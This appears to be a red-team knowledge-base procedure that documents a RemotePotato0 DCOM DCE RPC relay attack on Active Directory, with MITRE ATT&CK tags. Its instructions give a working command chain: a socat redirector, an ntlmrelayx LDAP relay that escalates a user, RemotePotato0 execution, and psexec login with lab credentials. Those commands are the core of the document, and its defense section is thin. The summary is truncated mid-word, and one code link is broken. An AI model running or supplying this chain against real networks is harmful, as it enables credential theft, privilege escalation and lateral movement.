---
id: 40149c48-19aa-49ea-81c6-de0ac402fe52
name: DCOM DCE RPC Relay using RemotePotato0
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:05.617427+00:00'
updated_at: '2023-04-10T20:26:29.600599+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Exploitation for Credential Access|T1212 - Exploitation for Credential Access]]'
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Man-in-the-Middle attacks & relaying]]'
- '[[RemotePotato0 DCOM DCE RPC relay]]'
commands:
- '[[Execute psexec.py]]'
- '[[Execute RemotePotato0]]'
- '[[NTLM relay attack]]'
- '[[Setup TCP listener]]'
---

# DCOM DCE RPC Relay using RemotePotato0

## Summary

DCOM DCE RPC Relay using RemotePotato0 is a technique used to gain access to a target system by exploiting the DCOM DCE RPC service. This is achieved by relaying the authentication to another system and using it to execute arbitrary code on the target system. This technique is commonly used in man-

## Description

# Description

DCOM DCE RPC Relay using RemotePotato0 is a technique used to gain access to a target system by exploiting the DCOM DCE RPC service. This is achieved by relaying the authentication to another system and using it to execute arbitrary code on the target system. This technique is commonly used in man-in-the-middle attacks and can lead to complete compromise of the target system.

Technical Explanation:
DCOM DCE RPC Relay using RemotePotato0 takes advantage of the DCOM DCE RPC service, which is used to allow remote execution of code on a target system. By relaying the authentication to another system, an attacker can execute arbitrary code on the target system as if they were an authenticated user. This technique is commonly used in man-in-the-middle attacks, where an attacker intercepts network traffic and relays it to another system to execute the attack.

Business Value:
DCOM DCE RPC Relay using RemotePotato0 can be used to gain access to a target system and execute arbitrary code on it. This can lead to the compromise of sensitive data, intellectual property, and other valuable assets. It can also be used to move laterally within a network and gain access to other systems, increasing the scope of the attack.

 

## Requirements

1. Access to a network with vulnerable DCOM DCE RPC service

1. RemotePotato0 tool

 

## Defense

1. Implement network segmentation to limit the attack surface

1. Ensure that DCOM DCE RPC service is properly configured and secured

1. Use strong authentication mechanisms such as multi-factor authentication

 

## Objectives

1. Gain access to a target system

1. Execute arbitrary code on the target system

1. Move laterally within a network

 

# Instructions

1. Follow the below instructions to execute RemotePotato0 command:

 



**Code**: [[# https://github.com/antonioCoco/RemotePotato0/
Te]]



> 1. First, open the terminal and execute the following command: 'sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # Can be omitted for Windows Server <= 2016'
2. Next, execute the command 'sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1'
3. Then, execute the command 'Session0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2'
4. Finally, execute the command 'psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'' to complete the process.



**Command** ([[Setup TCP listener]]):

```bash
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 &
```





**Command** ([[NTLM relay attack]]):

```bash
sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
```





**Command** ([[Execute RemotePotato0]]):

```bash
RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2
```





**Command** ([[Execute psexec.py]]):

```bash
psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Exploitation for Credential Access|T1212 - Exploitation for Credential Access]]
- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]

## Commands Used

- [[Execute psexec.py]]
- [[Execute RemotePotato0]]
- [[NTLM relay attack]]
- [[Setup TCP listener]]

## Tags

- [[Active Directory Attacks]]
- [[Man-in-the-Middle attacks & relaying]]
- [[RemotePotato0 DCOM DCE RPC relay]]


